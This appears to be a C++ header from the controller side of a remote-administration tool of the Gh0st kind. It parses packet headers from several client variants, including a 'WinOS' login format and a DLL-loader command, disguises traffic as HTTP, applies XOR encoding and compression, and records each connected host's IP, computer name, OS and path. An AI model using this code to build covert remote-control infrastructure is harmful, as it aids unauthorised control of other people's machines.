#pragma once

#include "stdafx.h"
#include "common/mask.h"
#include "common/header.h"
#include "common/encrypt.h"

#include "Buffer.h"
#define XXH_INLINE_ALL
#include "xxhash.h"
#include <WS2tcpip.h>
#include <common/ikcp.h>

#define PACKET_LENGTH   0x2000

std::string GetPeerName(SOCKET sock);
std::string GetRemoteIP(SOCKET sock);

// ZSTD
#include "zstd/zstd.h"
#ifdef _WIN64
#pragma comment(lib, "zstd/zstd_x64.lib")
#else
#pragma comment(lib, "zstd/zstd.lib")
#endif
#define C_FAILED(p) ZSTD_isError(p)
#define C_SUCCESS(p) (!C_FAILED(p))

#define Mcompress(dest, destLen, source, sourceLen, level) m_Cctx ? ZSTD_compress2(m_Cctx, dest, *(destLen), source, sourceLen):\
	ZSTD_compress(dest, *(destLen), source, sourceLen, level)

#define Muncompress(dest, destLen, source, sourceLen) m_Dctx ? ZSTD_decompressDCtx(m_Dctx, dest, *(destLen), source, sourceLen):\
	ZSTD_decompress(dest, *(destLen), source, sourceLen)

enum {
    PARSER_WINOS = -2,
    PARSER_FAILED = -1,			// 解析失败
    PARSER_NEEDMORE = 0,		// 需要更多数据
};

typedef struct PR {
    int Result;
    bool IsFailed() const
    {
        return PARSER_FAILED == Result;
    }
    bool IsNeedMore() const
    {
        return PARSER_NEEDMORE == Result;
    }
    bool IsWinOSLogin() const
    {
        return PARSER_WINOS == Result;
    }
} PR;

enum {
    COMPRESS_UNKNOWN = -2,			// 未知压缩算法
    COMPRESS_ZLIB = -1,				// 以前版本使用的压缩方法
    COMPRESS_ZSTD = 0,				// 当前使用的压缩方法
    COMPRESS_NONE = 1,				// 没有压缩
};

// Header parser: parse the data to make sure it's from a supported client.
class HeaderParser
{
    friend class CONTEXT_OBJECT;
protected:
    HeaderParser()
    {
        m_bShouldUnmask = -1;
        m_Masker = nullptr;
        m_Encoder = nullptr;
        m_Encoder2 = nullptr;
        m_bParsed = FALSE;
        m_nHeaderLen = m_nCompareLen = m_nFlagLen = 0;
        m_nFlagType = FLAG_UNKNOWN;
        memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
    }
    virtual ~HeaderParser()
    {
        Reset();
    }
    std::string getXForwardedFor(const std::string& headers)
    {
        const std::string key = "X-Forwarded-For: ";
        size_t pos = headers.find(key);
        if (pos == std::string::npos)
            return "";
        pos += key.size();
        size_t end = headers.find("\r\n", pos);
        if (end == std::string::npos)
            return "";
        std::string ip = headers.substr(pos, end - pos);
        return ip;
    }
    PR Parse(CBuffer& buf, int& compressMethod, std::string &peer)
    {
        const int MinimumCount = MIN_COMLEN;
        if (buf.GetBufferLength() < MinimumCount) {
            return PR{ PARSER_NEEDMORE };
        }
        // UnMask
        char* src = (char*)buf.GetBuffer();
        ULONG srcSize = buf.GetBufferLength();
        PkgMaskType maskType = m_bShouldUnmask ? MaskTypeUnknown : MaskTypeNone;
        ULONG ret = m_bShouldUnmask ? TryUnMask(src, srcSize, maskType) : 0;
        std::string str = buf.Skip(ret);
        if (maskType == MaskTypeHTTP) {
            m_bShouldUnmask = TRUE;
            std::string clientIP = getXForwardedFor(str);
            if (!clientIP.empty()) peer = clientIP;
        } else {
            m_bShouldUnmask = FALSE;
        }
        if (nullptr == m_Masker) {
            m_Masker = maskType ? new HttpMask(peer) : new PkgMask();
        }
        if ((maskType && ret == 0) || (buf.GetBufferLength() <= MinimumCount))
            return PR{ PARSER_NEEDMORE };

        char szPacketFlag[32] = { 0 };
        buf.CopyBuffer(szPacketFlag, MinimumCount, 0);
        HeaderEncType encTyp = HeaderEncUnknown;
        FlagType flagType = CheckHead(szPacketFlag, encTyp);
        if (flagType == FLAG_UNKNOWN) {
            // 数据长度 + 通信密码 [4字节启动时间+4个0字节+命令标识+系统位数标识]
            const BYTE* ptr = (BYTE*)buf.GetBuffer(0), * p = ptr + 4;
            int length = *((int*)ptr);
            int excepted = buf.GetBufferLength();
            if (length == excepted && length == 16 && p[4] == 0 && p[5] == 0 &&
                p[6] == 0 && p[7] == 0 && p[8] == 202 && (p[9] == 0 || p[9] == 1)) {
                m_nFlagType = FLAG_WINOS;
                compressMethod = COMPRESS_NONE;
                memcpy(m_szPacketFlag, p, 10); // 通信密码
                m_nCompareLen = 0;
                m_nFlagLen = 0;
                m_nHeaderLen = 14;
                m_bParsed = TRUE;
                m_Encoder = new Encoder();
                m_Encoder2 = new WinOsEncoder();
                return PR{ PARSER_WINOS };
            }
            return PR{ PARSER_FAILED };
        }
        if (m_bParsed) { // Check if the header has been parsed.
            return memcmp(m_szPacketFlag, szPacketFlag, m_nCompareLen) == 0 ? PR{ m_nFlagLen } : PR{ PARSER_FAILED };
        }
        // More version may be added in the future.
        switch (m_nFlagType = flagType) {
        case FLAG_UNKNOWN:
            return PR{ PARSER_FAILED };
        case FLAG_SHINE:
            memcpy(m_szPacketFlag, szPacketFlag, 5);
            m_nCompareLen = 5;
            m_nFlagLen = m_nCompareLen;
            m_nHeaderLen = m_nFlagLen + 8;
            m_bParsed = TRUE;
            assert(NULL==m_Encoder);
            assert(NULL==m_Encoder2);
            m_Encoder = new Encoder();
            m_Encoder2 = new Encoder();
            break;
        case FLAG_FUCK:
            memcpy(m_szPacketFlag, szPacketFlag, 8);
            m_nCompareLen = 8;
            m_nFlagLen = m_nCompareLen + 3;
            m_nHeaderLen = m_nFlagLen + 8;
            m_bParsed = TRUE;
            m_Encoder = new XOREncoder();
            m_Encoder2 = new Encoder();
            break;
        case FLAG_HELLO:
            // This header is only for handling SOCKET_DLLLOADER command
            memcpy(m_szPacketFlag, szPacketFlag, 8);
            m_nCompareLen = 6;
            m_nFlagLen = 8;
            m_nHeaderLen = m_nFlagLen + 8;
            m_bParsed = TRUE;
            compressMethod = COMPRESS_NONE;
            m_Encoder = new Encoder();
            m_Encoder2 = new XOREncoder16();
            break;
        case FLAG_HELL:
            // This version
            memcpy(m_szPacketFlag, szPacketFlag, 8);
            m_nCompareLen = FLAG_COMPLEN;
            m_nFlagLen = FLAG_LENGTH;
            m_nHeaderLen = m_nFlagLen + 8;
            m_bParsed = TRUE;
            m_Encoder = new Encoder();
            m_Encoder2 = new XOREncoder16();
            break;
        default:
            break;
        }
        return PR{ m_nFlagLen };
    }
    BOOL IsEncodeHeader() const
    {
        return m_nFlagType == FLAG_HELLO || m_nFlagType == FLAG_HELL;
    }
    HeaderParser& Reset()
    {
        m_bShouldUnmask = -1;
        if (m_Masker) {
            m_Masker->Destroy();
            m_Masker = nullptr;
        }
        SAFE_DELETE(m_Encoder);
        SAFE_DELETE(m_Encoder2);
        m_bParsed = FALSE;
        m_nHeaderLen = m_nCompareLen = m_nFlagLen = 0;
        m_nFlagType = FLAG_UNKNOWN;
        memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
        return *this;
    }
    BOOL IsParsed() const
    {
        return m_bParsed;
    }
    int GetFlagLen() const
    {
        return m_nFlagLen;
    }
    int GetHeaderLen() const
    {
        return m_nHeaderLen;
    }
    const char* GetFlag() const
    {
        return m_szPacketFlag;
    }
    FlagType GetFlagType() const
    {
        return m_nFlagType;
    }
    Encoder* GetEncoder() const
    {
        return m_Encoder;
    }
    Encoder* GetEncoder2() const
    {
        return m_Encoder2;
    }
private:
    BOOL				m_bParsed;					// 数据包是否可以解析
    int					m_nHeaderLen;				// 数据包的头长度
    int					m_nCompareLen;				// 比对字节数
    int					m_nFlagLen;					// 标识长度
    FlagType			m_nFlagType;				// 标识类型
    char				m_szPacketFlag[32];			// 对比信息
    Encoder*			m_Encoder;					// 编码器
    Encoder*			m_Encoder2;					// 编码器2
    PkgMask*			m_Masker;
    int                 m_bShouldUnmask;
};

enum IOType {
    IOInitialize,
    IORead,
    IOWrite,
    IOIdle
};

#define TRACK_OVERLAPPEDPLUS 0

class OVERLAPPEDPLUS
{
public:

    OVERLAPPED			m_ol;
    IOType				m_ioType;

    OVERLAPPEDPLUS(IOType ioType)
    {
#if TRACK_OVERLAPPEDPLUS
        char szLog[100];
        sprintf_s(szLog, "=> [new] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
        Mprintf(szLog);
#endif
        ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
        m_ioType = ioType;
    }

    ~OVERLAPPEDPLUS()
    {
#if TRACK_OVERLAPPEDPLUS
        char szLog[100];
        sprintf_s(szLog, "=> [delete] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
        Mprintf(szLog);
#endif
    }
};

class CONTEXT_OBJECT;
typedef BOOL (CALLBACK* pfnNotifyProc)(CONTEXT_OBJECT* ContextObject);
typedef BOOL (CALLBACK* pfnOfflineProc)(CONTEXT_OBJECT* ContextObject);

class Server
{
public:
    friend class CONTEXT_OBJECT;

    Server() {}
    virtual ~Server() {}

    virtual int GetPort() const = 0;

    virtual UINT StartServer(pfnNotifyProc NotifyProc, pfnOfflineProc OffProc, USHORT uPort) = 0;

    virtual	BOOL Send2Client(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) = 0;

    virtual void UpdateMaxConnection(int maxConn) {}

    virtual void Destroy() {}

    virtual void Disconnect(CONTEXT_OBJECT* ctx) {}
};

// 预分配解压缩缓冲区大小
#define PREALLOC_DECOMPRESS_SIZE (4 * 1024)

#include "context.h"
typedef class CONTEXT_OBJECT : public context
{
public:
    virtual ~CONTEXT_OBJECT()
    {
        if (kcp) {
            ikcp_release(kcp);
            kcp = nullptr;
        }
        FreeDecompressBuffer();
        FreeCompressBuffer();
        FreeSendCompressBuffer();
        if (Zcctx) {
            ZSTD_freeCCtx(Zcctx);
            Zcctx = nullptr;
        }
    }
    CString  sClientInfo[ONLINELIST_MAX];
    CString  additonalInfo[RES_MAX];
    SOCKET   sClientSocket;
    WSABUF   wsaInBuf;
    WSABUF	 wsaOutBuffer;
    char     szBuffer[PACKET_LENGTH];
    CBuffer				InCompressedBuffer;	        // 接收到的压缩的数据
    CBuffer				InDeCompressedBuffer;	    // 解压后的数据
    CBuffer             OutCompressedBuffer;
    HANDLE              hDlg;                       // 对话框指针
    OVERLAPPEDPLUS*		olps;						// OVERLAPPEDPLUS
    int					CompressMethod;				// 压缩算法
    HeaderParser		Parser;						// 解析数据协议
    uint64_t			ID;							// 唯一标识

    BOOL				m_bProxyConnected;			// 代理是否连接
    BOOL 				bLogin;						// 是否 login
    std::string			PeerName;					// 对端IP
    Server*				server;						// 所属服务端
    ikcpcb*				kcp = nullptr;				// 新增，指向KCP会话
    std::string			GroupName;					// 分组名称
    CLock               SendLock;                   // fix #214
    time_t              OnlineTime;                 // 上线时间

    // 预分配的解压缩缓冲区，避免频繁内存分配
    PBYTE               DecompressBuffer = nullptr;
    ULONG               DecompressBufferSize = 0;
    // 预分配的压缩数据缓冲区（接收时解压前）
    PBYTE               CompressBuffer = nullptr;
    ULONG               CompressBufferSize = 0;
    // 预分配的发送压缩缓冲区（发送时压缩后）
    PBYTE               SendCompressBuffer = nullptr;
    ULONG               SendCompressBufferSize = 0;
    int                 CompressLevel = ZSTD_CLEVEL_DEFAULT;
    ZSTD_CCtx*          Zcctx = nullptr;

    void EnableZstdContext(int level = ZSTD_CLEVEL_DEFAULT) {
        CAutoCLock L(SendLock);
        CompressLevel = level;
        if (Zcctx == nullptr) {
            Zcctx = ZSTD_createCCtx();
            ZSTD_CCtx_setParameter(Zcctx, ZSTD_c_compressionLevel, level);
        }
    }
    void SetCompressionLevel(int level) {
        CAutoCLock L(SendLock);
        CompressLevel = level;
        if (Zcctx) {
            ZSTD_CCtx_setParameter(Zcctx, ZSTD_c_compressionLevel, level);
        }
    }
    int GetZstdLevel() const {
        return CompressLevel;
    }
    // 获取或分配解压缩缓冲区
    PBYTE GetDecompressBuffer(ULONG requiredSize)
    {
        if (DecompressBuffer == nullptr || DecompressBufferSize < requiredSize) {
            FreeDecompressBuffer();
            // 分配时预留一些余量，减少重新分配次数
            DecompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
            DecompressBuffer = new BYTE[DecompressBufferSize];
        }
        return DecompressBuffer;
    }

    void FreeDecompressBuffer()
    {
        if (DecompressBuffer) {
            delete[] DecompressBuffer;
            DecompressBuffer = nullptr;
            DecompressBufferSize = 0;
        }
    }

    // 获取或分配压缩数据缓冲区（用于接收时存放解压前的数据）
    PBYTE GetCompressBuffer(ULONG requiredSize)
    {
        if (CompressBuffer == nullptr || CompressBufferSize < requiredSize) {
            FreeCompressBuffer();
            CompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
            CompressBuffer = new BYTE[CompressBufferSize];
        }
        return CompressBuffer;
    }

    void FreeCompressBuffer()
    {
        if (CompressBuffer) {
            delete[] CompressBuffer;
            CompressBuffer = nullptr;
            CompressBufferSize = 0;
        }
    }

    // 获取或分配发送用压缩缓冲区（用于发送时存放压缩后的数据）
    PBYTE GetSendCompressBuffer(ULONG requiredSize)
    {
        if (SendCompressBuffer == nullptr || SendCompressBufferSize < requiredSize) {
            FreeSendCompressBuffer();
            SendCompressBufferSize = max(requiredSize, PREALLOC_DECOMPRESS_SIZE);
            SendCompressBuffer = new BYTE[SendCompressBufferSize];
        }
        return SendCompressBuffer;
    }

    void FreeSendCompressBuffer()
    {
        if (SendCompressBuffer) {
            delete[] SendCompressBuffer;
            SendCompressBuffer = nullptr;
            SendCompressBufferSize = 0;
        }
    }

    std::string GetProtocol() const override
    {
        return Parser.m_Masker && Parser.m_Masker->GetMaskType() == MaskTypeNone ? "TCP" : "HTTP";
    }
    int GetServerPort() const override
    {
        return server->GetPort();
    }
    VOID InitMember(SOCKET s, VOID*svr)
    {
        memset(szBuffer, 0, sizeof(char) * PACKET_LENGTH);
        hDlg = NULL;
        sClientSocket = s;
        PeerName = ::GetPeerName(sClientSocket);
        memset(&wsaInBuf, 0, sizeof(WSABUF));
        memset(&wsaOutBuffer, 0, sizeof(WSABUF));
        olps = NULL;
        for (int i = 0; i < ONLINELIST_MAX; i++) {
            sClientInfo[i].Empty();
        }
        for (int i = 0; i < RES_MAX; i++) {
            additonalInfo[i].Empty();
        }
        CompressMethod = COMPRESS_ZSTD;
        Parser.Reset();
        bLogin = FALSE;
        m_bProxyConnected = FALSE;
        server = (Server*)svr;
        OnlineTime = time(0);
    }
    uint64_t GetAliveTime()const
    {
        return time(0) - OnlineTime;
    }
    Server* GetServer()
    {
        return server;
    }
    BOOL Send2Client(PBYTE szBuffer, ULONG ulOriginalLength) override
    {
        if (server) {
            CAutoCLock L(SendLock);
            return server->Send2Client(this, szBuffer, ulOriginalLength);
        }
        return FALSE;
    }
    VOID SetClientInfo(const CString(&s)[ONLINELIST_MAX], const std::vector<std::string>& a = {})
    {
        for (int i = 0; i < ONLINELIST_MAX; i++) {
            sClientInfo[i] = s[i];
        }
        for (int i = 0; i < a.size() && i < RES_MAX; i++) {
            additonalInfo[i] = a[i].c_str();
        }
    }
    PBYTE GetBuffer(int offset)
    {
        return InDeCompressedBuffer.GetBuffer(offset);
    }
    ULONG GetBufferLength()
    {
        return InDeCompressedBuffer.GetBufferLength();
    }
    virtual std::string GetPeerName() const
    {
        return PeerName;
    }
    void SetPeerName(const std::string& peer)
    {
        PeerName = peer;
    }
    virtual int GetPort() const
    {
		// 第一次返回套接字，后续返回地址栏端口号
        if (sClientInfo[ONLINELIST_ADDR].IsEmpty())
            return sClientSocket;
        return atoi(sClientInfo[ONLINELIST_ADDR]);
    }
    CString GetClientData(int index)  const override
    {
        return sClientInfo[index];
    }
    void GetAdditionalData(CString(&s)[RES_MAX])  const override
    {
        for (int i = 0; i < RES_MAX; i++) {
            s[i] = additonalInfo[i];
        }
    }
    CString GetAdditionalData(int index) const override
    {
        return additonalInfo[index];
    }
    void SetAdditionalData(int index, const std::string &value)
    {
		if (index >= 0 && index < RES_MAX) {
            additonalInfo[index] = value.c_str();
        }
	}
    std::string GetGroupName() const override
    {
        return GroupName;
    }
    BOOL IsLogin() const override
    {
        return bLogin;
    }
    uint64_t GetClientID() const override
    {
        return ID;
    }
    void CancelIO()
    {
        SAFE_CANCELIO(sClientSocket);
    }
    BOOL CopyBuffer(PVOID pDst, ULONG nLen, ULONG ulPos)
    {
        return InDeCompressedBuffer.CopyBuffer(pDst, nLen, ulPos);
    }
    BYTE GetBYTE(int offset)
    {
        return InDeCompressedBuffer.GetBYTE(offset);
    }
    virtual FlagType GetFlagType() const override
    {
        return Parser.m_nFlagType;
    }
    // Write compressed buffer.
    void WriteBuffer(LPBYTE data, ULONG dataLen, ULONG originLen, int cmd = -1)
    {
        if (Parser.IsParsed()) {
            ULONG totalLen = dataLen + Parser.GetHeaderLen();
            BYTE szPacketFlag[32] = {};
            const int flagLen = Parser.GetFlagLen();
            memcpy(szPacketFlag, Parser.GetFlag(), flagLen);
            if (Parser.IsEncodeHeader())
                encrypt(szPacketFlag, FLAG_COMPLEN, szPacketFlag[flagLen - 2]);
            CBuffer buf;
            buf.WriteBuffer((LPBYTE)szPacketFlag, flagLen);
            buf.WriteBuffer((PBYTE)&totalLen, sizeof(ULONG));
            if (Parser.GetFlagType() == FLAG_WINOS) {
                memcpy(szPacketFlag, Parser.GetFlag(), 10);
                buf.WriteBuffer((PBYTE)Parser.GetFlag(), 10);
            } else {
                buf.WriteBuffer((PBYTE)&originLen, sizeof(ULONG));
                InDeCompressedBuffer.CopyBuffer(szPacketFlag + flagLen, 16, 16);
            }
            Encode2(data, dataLen, szPacketFlag);
            buf.WriteBuffer(data, dataLen);
            // Mask
            char* src = (char*)buf.GetBuffer(), *szBuffer = nullptr;
            ULONG ulLength = 0;
            Parser.m_Masker->Mask(szBuffer, ulLength, src, buf.GetBufferLen(), cmd);
            OutCompressedBuffer.WriteBuffer((LPBYTE)szBuffer, ulLength);
            if (szBuffer != src)
                SAFE_DELETE_ARRAY(szBuffer);
        }
    }
    // Read compressed buffer. 使用预分配缓冲区，避免频繁内存分配
    PBYTE ReadBuffer(ULONG& dataLen, ULONG& originLen)
    {
        if (Parser.IsParsed()) {
            ULONG totalLen = 0;
            BYTE szPacketFlag[32] = {};
            InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, Parser.GetFlagLen());
            InCompressedBuffer.ReadBuffer((PBYTE)&totalLen, sizeof(ULONG));
            if (Parser.GetFlagType() == FLAG_WINOS) {
                InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, 10);
            } else {
                InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
            }
            dataLen = totalLen - Parser.GetHeaderLen();
            // 使用预分配缓冲区替代每次 new
            PBYTE CompressedBuffer = GetCompressBuffer(dataLen);
            InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
            Decode2(CompressedBuffer, dataLen, szPacketFlag);
            return CompressedBuffer;
        }
        return nullptr;
    }
    // Parse the data to make sure it's from a supported client. The length of `Header Flag` will be returned.
    PR Parse(CBuffer& buf)
    {
        return Parser.Parse(buf, CompressMethod, PeerName);
    }
    void Encode(PBYTE data, int len, const bool &flag) const
    {
        flag ? (len > 1 ? data[1] ^= 0x2B : 0x2B == 0x2B) : 0x2B == 0x2B;
    }
    // Encode data before compress.
    void Encode(PBYTE data, int len) const
    {
        auto enc = Parser.GetEncoder();
        if (enc) enc->Encode((unsigned char*)data, len);
    }
    // Decode data after uncompress.
    void Decode(PBYTE data, int len) const
    {
        auto enc = Parser.GetEncoder();
        if (enc) enc->Decode((unsigned char*)data, len);
    }
    // Encode data after compress.
    void Encode2(PBYTE data, int len, PBYTE param) const
    {
        auto enc = Parser.GetEncoder2();
        if (enc) enc->Encode((unsigned char*)data, len, param);
    }
    // Decode data before uncompress.
    void Decode2(PBYTE data, int len, PBYTE param) const
    {
        auto enc = Parser.GetEncoder2();
        if (enc) enc->Decode((unsigned char*)data, len, param);
    }
    std::string RemoteAddr() const
    {
        sockaddr_in  ClientAddr = {};
        int ulClientAddrLen = sizeof(sockaddr_in);
        int s = getpeername(sClientSocket, (SOCKADDR*)&ClientAddr, &ulClientAddrLen);
        return s != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";
    }
    static uint64_t CalculateID(const CString(&data)[ONLINELIST_MAX])
    {
        int idx[] = { ONLINELIST_PUBIP, ONLINELIST_COMPUTER_NAME, ONLINELIST_OS, ONLINELIST_CPU, ONLINELIST_PATH, };
        CString s;
        for (int i = 0; i < 5; i++) {
            s += data[idx[i]] + "|";
        }
        s.Delete(s.GetLength() - 1);
        return XXH64(s.GetString(), s.GetLength(), 0);
    }
    uint64_t GetID() const
    {
        return ID;
    }
    void SetID(uint64_t id)
    {
        ID = id;
    }
    void SetGroup(const std::string& group)
    {
        GroupName = group;
    }
    void SetNoDelay(BOOL bNoDelay = TRUE)
    {
        setsockopt(sClientSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNoDelay, sizeof(BOOL));
    }
} CONTEXT_OBJECT, * PCONTEXT_OBJECT;

typedef CList<PCONTEXT_OBJECT> ContextObjectList;

class CONTEXT_UDP : public CONTEXT_OBJECT
{
public:
    int					addrLen = 0;
    sockaddr_in			clientAddr = {};
    CONTEXT_UDP()
    {
    }
    virtual ~CONTEXT_UDP()
    {
    }
    std::string GetProtocol() const override
    {
        return "UDP";
    }
    VOID InitMember(SOCKET s, VOID* svr) override
    {
        CONTEXT_OBJECT::InitMember(s, svr);
        clientAddr = {};
        addrLen = sizeof(sockaddr_in);
    }
    void Destroy() override
    {
        delete this;
    }
    virtual std::string GetPeerName() const override
    {
        char client_ip[INET_ADDRSTRLEN];
#if (defined(_WIN32_WINNT) && _WIN32_WINNT <= 0x0501)
		strncpy(client_ip, inet_ntoa(clientAddr.sin_addr), INET_ADDRSTRLEN - 1);
		client_ip[INET_ADDRSTRLEN - 1] = '\0';
#else
        inet_ntop(AF_INET, &clientAddr.sin_addr, client_ip, INET_ADDRSTRLEN);
#endif
        return client_ip;
    }
    virtual int GetPort() const override
    {
        int client_port = ntohs(clientAddr.sin_port);
        return client_port;
    }
};
